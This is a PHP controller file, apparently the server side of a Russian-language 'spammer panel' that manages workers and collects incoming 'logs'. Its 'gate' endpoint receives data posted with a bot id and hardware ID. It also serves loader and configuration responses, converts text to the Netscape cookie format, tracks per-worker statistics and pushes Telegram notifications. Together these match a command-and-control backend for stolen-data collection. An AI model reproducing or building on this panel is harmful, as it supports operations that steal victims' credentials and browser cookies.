<?php
namespace application\controllers;

use application\core\Controller;
use application\lib\Answer;
use application\lib\User;
use application\lib\TelegramService;
use \R;

class MainController extends Controller {

	public function loaderAction() {
		$this->model->loader($this->route["name"]);
	}

	public function telegramAction() {
		$this->model->telegram(file_get_contents('php://input'));
	}

	public function installAction() {
		if(empty($_POST)) {
			$this->view->layout = "headers";
			$this->view->render("Установка панели");
		}
		else {
			echo json_encode($this->model->install($_POST["hostname"],$_POST["db_name"],$_POST["db_login"],$_POST["db_pass"],$_POST["user_login"],$_POST["user_pass"])->Return());
		}
	}

	public function socketsAction() {
    	$logs = $this->user->withCondition('new = ?', [1])->ownLogsList;
    	$result = [];

    	if(count($logs) > 0) {
    		$result = [];

    		$log = current($logs);
    		$log->new = 0;

			R::store($this->user);
			$result = $log;
    	}
		echo json_encode($result);
	}

	public function checkAction() {
		if(empty($_POST["token"])) {
			$this->view->layout = "headers";
			$this->view->render("Панель спамера");
		}
		else {
			echo json_encode($this->model->check_token($_POST["token"])->Return());
		}
	}

	public function statisticAction() {
		$spamer = R::findOne("spamers", "hash = ?", [$this->route["token"]]);

		if($spamer != null) {
			$this->view->layout = "headers";
			$this->view->render("Статистика", ["login" => $spamer->login, "token" => $this->route["token"]]);
		}
	}

	public function logoutAction() {
		setcookie("auth", "", time() - 3600);
		session_destroy();

		\application\core\View::redirect("/login");
	}

	public function spamersAction() {
		$this->view->render("Спамеры");
	}

	public function spamerAction() {
		if($this->route["type"] == "add")
			echo json_encode($this->model->add_spamer($_POST["login"])->Return());
		else if($this->route["type"] == "edit")
			echo json_encode($this->model->edit_spamer($_POST["o_name"], $_POST["n_name"])->Return());
		else if($this->route["type"] == "delete")
			echo json_encode($this->model->delete_spamer($_POST["id"])->Return());
		else if($this->route["type"] == "alldata")
			echo json_encode($this->model->all_spamers_info());
		else if($this->route["type"] == "activity")
			echo json_encode($this->model->get_spamers_activity(), true);
	}

	public function getTableAction() {
		if($this->route["type"] == "spamers")
			echo json_encode($this->model->get_spamers_table());
		else if($this->route["type"] == "spamers_stat") 
			echo json_encode($this->model->get_spamers_stat_table());
	}

	public function indexAction() {
		$this->view->render('Главная');
	}

	public function netscapeAction() {
		echo json_encode($this->model->netscape($_POST["text"]));
	}

	public function loginAction() {
		if(!empty($_POST["login"]) && !empty($_POST["password"])) {
			echo json_encode($this->model->sign_in($_POST["login"], $_POST["password"], $_POST["fa_code"])->Return());
		}
		else {
			$this->view->layout = "headers";
			$this->view->render('Авторизация');
		}
	}

	public function gateAction() {
		if(empty($_POST))
			\application\core\View::errorCode(404);

		if($this->model->gate_check($_POST["id"], $_SERVER["REMOVE_ADDR"], $_POST["hwid"])) {
			$this->model->gate($_POST);
		}
	}

	public function configAction() {
		if(empty($_POST["id"]))
			\application\core\View::errorCode(404);

		echo json_encode($this->model->config($_POST["id"]), JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
	}
}